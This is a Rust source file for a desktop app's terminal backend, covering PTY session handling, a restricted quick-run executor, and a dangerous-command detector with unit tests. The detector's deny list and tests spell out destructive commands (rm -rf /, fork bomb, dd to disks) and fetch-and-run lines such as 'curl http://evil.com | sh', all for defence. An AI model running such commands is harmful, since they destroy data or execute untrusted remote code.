use std::io::{Read, Write};
use std::sync::{Arc, Mutex};
use std::thread;
use std::process::{Command, Stdio};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use crate::state::{PtySession, PTY_SESSIONS};

/// Check if a command is dangerous. Returns a warning description if so.
fn check_dangerous_command(cmd: &str) -> Option<String> {
    let normalized = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
    let lower = normalized.to_lowercase();

    let patterns: &[(&str, &str)] = &[
        // Destructive file operations
        ("rm -rf /", "Recursive delete of root filesystem"),
        ("rm -rf ~", "Recursive delete of home directory"),
        ("rm -rf /*", "Recursive delete of all root directories"),
        ("rm -rf .", "Recursive delete of current directory"),
        // Disk operations
        ("mkfs.", "Format filesystem"),
        ("dd if=", "Raw disk write (dd)"),
        ("> /dev/sd", "Direct write to block device"),
        ("> /dev/disk", "Direct write to block device"),
        // Fork bomb
        (":(){ :|:& };:", "Fork bomb — will crash your system"),
        // System shutdown/reboot
        ("shutdown", "System shutdown"),
        ("reboot", "System reboot"),
        ("halt", "System halt"),
        ("init 0", "System halt"),
        ("init 6", "System reboot"),
        // Kill all processes
        ("kill -9 -1", "Kill all user processes"),
        ("killall -9", "Kill all matching processes"),
        ("pkill -9", "Kill all matching processes"),
        // Permission disasters
        ("chmod -r 777 /", "Remove all file permissions recursively on /"),
        ("chmod -r 000 /", "Remove all file permissions recursively on /"),
        ("chown -r", "Recursive ownership change"),
        // Pipe to shell (remote code execution)
        ("curl|sh", "Piping remote content to shell"),
        ("curl|bash", "Piping remote content to shell"),
        ("wget|sh", "Piping remote content to shell"),
        ("wget|bash", "Piping remote content to shell"),
        ("curl | sh", "Piping remote content to shell"),
        ("curl | bash", "Piping remote content to shell"),
        ("wget | sh", "Piping remote content to shell"),
        ("wget | bash", "Piping remote content to shell"),
        // Overwrite boot
        ("dd of=/dev/sda", "Overwrite boot disk"),
        ("dd of=/dev/disk", "Overwrite boot disk"),
        // History manipulation that might hide attacks
        ("history -c", "Clear shell history"),
        // Dangerous redirects
        ("> /dev/null 2>&1 &", "Silent background execution"),
    ];

    for (pattern, description) in patterns {
        if lower.contains(&pattern.to_lowercase()) {
            return Some(description.to_string());
        }
    }

    // Check for piped curl/wget to shell more flexibly
    if (lower.contains("curl ") || lower.contains("wget "))
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("|sh") || lower.contains("|bash"))
    {
        return Some("Piping remote content to shell — potential remote code execution".to_string());
    }

    None
}

#[tauri::command]
pub fn pty_spawn(id: String, cwd: Option<String>, window: tauri::Window) -> Result<(), String> {
    let pty_system = native_pty_system();

    let pair = pty_system
        .openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
        .map_err(|e| e.to_string())?;

    let shell = if cfg!(target_os = "windows") {
        "cmd"
    } else {
        if std::path::Path::new("/bin/bash").exists() {
            "/bin/bash"
        } else if std::path::Path::new("/bin/zsh").exists() {
            "/bin/zsh"
        } else {
            "/bin/sh"
        }
    };

    let mut cmd = CommandBuilder::new(shell);
    cmd.arg("-i");

    if let Some(dir) = cwd {
        cmd.cwd(dir);
    } else if let Some(home) = dirs::home_dir() {
        cmd.cwd(home);
    }

    cmd.env("TERM", "xterm-256color");
    cmd.env("COLORTERM", "truecolor");
    cmd.env("LC_ALL", "en_US.UTF-8");
    cmd.env("SHELL_SESSION_HISTORY", "0");
    cmd.env("BASH_SILENCE_DEPRECATION_WARNING", "1");
    cmd.env("PS1", "\\u@\\h \\W $ ");

    let mut child = pair.slave.spawn_command(cmd).map_err(|e| e.to_string())?;

    let mut reader = pair.master.try_clone_reader().map_err(|e| e.to_string())?;
    let writer = pair.master.take_writer().map_err(|e| e.to_string())?;

    {
        let mut sessions = PTY_SESSIONS.lock().map_err(|e| e.to_string())?;
        sessions.insert(id.clone(), PtySession {
            writer: Arc::new(Mutex::new(writer)),
            master: Arc::new(Mutex::new(pair.master)),
            command_buffer: Arc::new(Mutex::new(String::new())),
        });
    }

    let session_id = id.clone();
    thread::spawn(move || {
        let mut buffer = [0u8; 4096];
        loop {
            match reader.read(&mut buffer) {
                Ok(0) => {
                    let _ = window.emit("pty-exit", &session_id);
                    break;
                }
                Ok(n) => {
                    let output = String::from_utf8_lossy(&buffer[..n]).to_string();
                    let _ = window.emit("pty-output", (&session_id, &output));
                }
                Err(_) => {
                    let _ = window.emit("pty-exit", &session_id);
                    break;
                }
            }
        }

        if let Ok(mut sessions) = PTY_SESSIONS.lock() {
            sessions.remove(&session_id);
        }

        let _ = child.wait();
    });

    Ok(())
}

#[tauri::command]
pub fn pty_write(id: String, data: String, window: tauri::Window) -> Result<(), String> {
    let sessions = PTY_SESSIONS.lock().map_err(|e| e.to_string())?;
    if let Some(session) = sessions.get(&id) {
        let mut cmd_buf = session.command_buffer.lock().map_err(|e| e.to_string())?;

        for byte in data.bytes() {
            match byte {
                // Enter (carriage return)
                b'\r' | b'\n' => {
                    let command = cmd_buf.trim().to_string();
                    cmd_buf.clear();

                    if let Some(warning) = check_dangerous_command(&command) {
                        // Emit warning event instead of executing
                        let _ = window.emit("pty-danger-warning", (&id, &command, &warning));
                        return Ok(());
                    }

                    // Safe command — write all data through
                    let mut writer = session.writer.lock().map_err(|e| e.to_string())?;
                    writer.write_all(data.as_bytes()).map_err(|e| e.to_string())?;
                    writer.flush().map_err(|e| e.to_string())?;
                    return Ok(());
                }
                // Ctrl+C — clear buffer
                0x03 => {
                    cmd_buf.clear();
                }
                // Backspace / Delete
                0x7f | 0x08 => {
                    cmd_buf.pop();
                }
                // Printable characters
                b if b >= 0x20 => {
                    cmd_buf.push(b as char);
                }
                _ => {}
            }
        }

        // No Enter in this data — just pass through (typing characters)
        let mut writer = session.writer.lock().map_err(|e| e.to_string())?;
        writer.write_all(data.as_bytes()).map_err(|e| e.to_string())?;
        writer.flush().map_err(|e| e.to_string())?;
        Ok(())
    } else {
        Err("Session not found".to_string())
    }
}

/// Force-write to PTY bypassing the dangerous command check.
/// Called after user confirms a dangerous command warning.
#[tauri::command]
pub fn pty_write_force(id: String, data: String) -> Result<(), String> {
    let sessions = PTY_SESSIONS.lock().map_err(|e| e.to_string())?;
    if let Some(session) = sessions.get(&id) {
        let mut writer = session.writer.lock().map_err(|e| e.to_string())?;
        writer.write_all(data.as_bytes()).map_err(|e| e.to_string())?;
        writer.flush().map_err(|e| e.to_string())?;
        Ok(())
    } else {
        Err("Session not found".to_string())
    }
}

#[tauri::command]
pub fn pty_resize(id: String, rows: u16, cols: u16) -> Result<(), String> {
    let sessions = PTY_SESSIONS.lock().map_err(|e| e.to_string())?;
    if let Some(session) = sessions.get(&id) {
        let master = session.master.lock().map_err(|e| e.to_string())?;
        master.resize(PtySize {
            rows,
            cols,
            pixel_width: 0,
            pixel_height: 0,
        }).map_err(|e| format!("Failed to resize PTY: {}", e))?;
        Ok(())
    } else {
        Err("Session not found".to_string())
    }
}

#[tauri::command]
pub fn pty_kill(id: String) -> Result<(), String> {
    let mut sessions = PTY_SESSIONS.lock().map_err(|e| e.to_string())?;
    if sessions.remove(&id).is_some() {
        Ok(())
    } else {
        Err("Session not found".to_string())
    }
}

#[tauri::command]
pub fn execute_command(command: String, cwd: Option<String>) -> Result<String, String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return Err("Command cannot be empty".to_string());
    }

    let dangerous_patterns = ["rm -rf /", "mkfs.", "> /dev/", "dd if=", ":(){ :|:& };:"];
    for pattern in &dangerous_patterns {
        if trimmed.contains(pattern) {
            return Err(format!("Command blocked for safety: contains '{}'", pattern));
        }
    }

    let shell_meta = ["&&", "||", ";", "|", ">", "<", "`", "$(", "\n"];
    if shell_meta.iter().any(|item| trimmed.contains(item)) {
        return Err("Complex shell expressions are blocked in quick-run mode. Use the built-in terminal for advanced commands.".to_string());
    }

    let mut parts = trimmed.split_whitespace();
    let program = parts.next().ok_or("Command cannot be empty")?;
    let args: Vec<&str> = parts.collect();

    let allowed_programs = [
        "git", "ls", "pwd", "cat", "echo", "head", "tail", "grep", "find", "wc",
        "touch", "mkdir", "cp", "mv", "rm", "python3", "node", "npm", "cargo",
        "rustc", "swift", "swiftc", "bash", "zsh"
    ];
    if !allowed_programs.contains(&program) {
        return Err(format!("'{}' is not allowed in quick-run mode. Use the built-in terminal for unrestricted commands.", program));
    }

    let mut cmd = Command::new(program);
    cmd.args(&args);

    if let Some(dir) = cwd {
        cmd.current_dir(dir);
    }

    let output = cmd
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| e.to_string())?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !stderr.is_empty() && stdout.is_empty() {
        Ok(stderr.to_string())
    } else if !stderr.is_empty() {
        Ok(format!("{}\n{}", stdout, stderr))
    } else {
        Ok(stdout.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_rm_rf_root() {
        assert!(check_dangerous_command("rm -rf /").is_some());
        assert!(check_dangerous_command("rm  -rf  /").is_some());
        assert!(check_dangerous_command("sudo rm -rf /").is_some());
    }

    #[test]
    fn detects_rm_rf_home() {
        assert!(check_dangerous_command("rm -rf ~").is_some());
    }

    #[test]
    fn detects_fork_bomb() {
        assert!(check_dangerous_command(":(){ :|:& };:").is_some());
    }

    #[test]
    fn detects_curl_pipe_sh() {
        assert!(check_dangerous_command("curl http://evil.com | sh").is_some());
        assert!(check_dangerous_command("curl http://evil.com|bash").is_some());
        assert!(check_dangerous_command("wget http://evil.com | bash").is_some());
    }

    #[test]
    fn detects_mkfs() {
        assert!(check_dangerous_command("mkfs.ext4 /dev/sda1").is_some());
    }

    #[test]
    fn detects_dd() {
        assert!(check_dangerous_command("dd if=/dev/zero of=/dev/sda").is_some());
    }

    #[test]
    fn detects_shutdown() {
        assert!(check_dangerous_command("shutdown -h now").is_some());
        assert!(check_dangerous_command("reboot").is_some());
    }

    #[test]
    fn detects_kill_all() {
        assert!(check_dangerous_command("kill -9 -1").is_some());
    }

    #[test]
    fn allows_safe_commands() {
        assert!(check_dangerous_command("ls -la").is_none());
        assert!(check_dangerous_command("git status").is_none());
        assert!(check_dangerous_command("rm file.txt").is_none());
        assert!(check_dangerous_command("cargo build").is_none());
        assert!(check_dangerous_command("npm install").is_none());
        assert!(check_dangerous_command("mkdir new_dir").is_none());
        assert!(check_dangerous_command("cat README.md").is_none());
    }
}
